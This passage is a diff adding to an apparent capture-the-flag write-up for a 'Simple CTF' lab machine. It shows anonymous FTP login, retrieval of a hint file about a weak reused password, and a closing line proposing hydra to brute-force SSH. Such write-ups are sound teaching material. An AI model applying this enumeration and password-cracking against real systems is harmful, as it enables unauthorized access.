@@ -142,3 +142,57 @@ exploit.py  README.md
 
 ```
 
+Alternate path: you can open ftp and check ForMitch.txt. It will give you a hint about the type of password:
+
+```
+┌──(kali㉿kali)-[~/ken/CVE-2019-9053]
+└─$ ftp 10.10.134.118
+Connected to 10.10.134.118.
+220 (vsFTPd 3.0.3)
+Name (10.10.134.118:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> binary
+200 Switching to Binary mode.
+ftp> ls
+229 Entering Extended Passive Mode (|||46203|)
+ftp: Can't connect to `10.10.134.118:46203': Connection timed out
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp> get ForMitch.txt
+local: ForMitch.txt remote: ForMitch.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
+100% |**************************************************************************|   166        3.95 MiB/s    00:00 ETA
+226 Transfer complete.
+166 bytes received in 00:00 (0.22 KiB/s)
+ftp> 
+
+```
+
+cat ForMitch.txt
+
+```
+
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
+└─$ cat ForMitch.txt                 
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
+└─$ 
+
+
+```
+
+We can use hydra to crack password on ssh:
+
